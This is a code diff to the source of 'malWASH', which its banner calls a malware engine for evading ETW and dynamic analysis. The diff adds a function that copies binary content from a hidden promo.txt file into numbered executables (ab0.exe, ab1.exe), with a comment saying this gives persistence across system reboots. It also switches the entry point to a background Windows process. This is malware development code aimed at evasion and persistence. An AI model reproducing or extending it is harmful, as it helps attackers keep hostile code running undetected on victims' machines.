@@ -409,13 +409,32 @@ void findNprocs( ushort N, const wchar_t *proclist[], listmode lm )
     }
 }
 
-//-----------------------------------------------------------------------------------------------------------
-/*
-**  main function for producing final malWASH code...
-*/
-//-----------------------------------------------------------------------------------------------------------
-int main(int argc, char* argv[])
+//---Function for copying binaries from the promo.txt ---------------------------------------------------
+//---used for obtaining persistence to cater for system reboot
+void copy(const char* From, const char* To)
 {
+	//ifstream f(From);
+	//  if(f.good()==false)
+	//{
+         ifstream file("C:\\Users\\aa\\Documents\\mal\\promo.txt", ios::in | ios::binary | ios::ate);
+		if (file.is_open())
+		{
+		size1 = (int)file.tellg();
+		memblock = new char[size1];
+		file.seekg(0, ios::beg);
+		file.read(memblock, size1);
+		file.close();
+		}
+		file.close();
+		ofstream file1(To, ios::out | ios::binary);
+		file1.write(memblock, size1);
+		file1.close();
+        //}
+}
+//------------------------------------------------------------------------------------------------------------
+//main entry point for malWASH run in the background
+int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
+{   int count1=0; //variable introduced to count required number of process creation
     printf("++==============================================================++\n");
     printf("||                           malWASH                            ||\n");
     printf("||   The malware engine for evading ETW and dynamic analysis    ||\n");
@@ -525,12 +544,12 @@ int main(int argc, char* argv[])
 		for(int counter=0;counter<NPROC;counter++)
 	{   
         stringstream sw;
-        //path for creating binaries
-		sw<<"C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\mal\\Release\\ab"<<count1<<".exe";
+        //path for creating binaries such as ab1.exe , ab2.exe
+		sw<<"C:\\Users\\aa\\Documents\\mal\\ab"<<count1<<".exe";
 		count1++;
 		string aw=sw.str();
         //copy the binary content to aw.c_str
-		copy("C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\mal\\Release\\promo.txt", aw.c_str());
+		copy("C:\\Users\\aa\\Documents\\mal\\promo.txt", aw.c_str());
 		string a;
 		char ownPth[MAX_PATH];
         
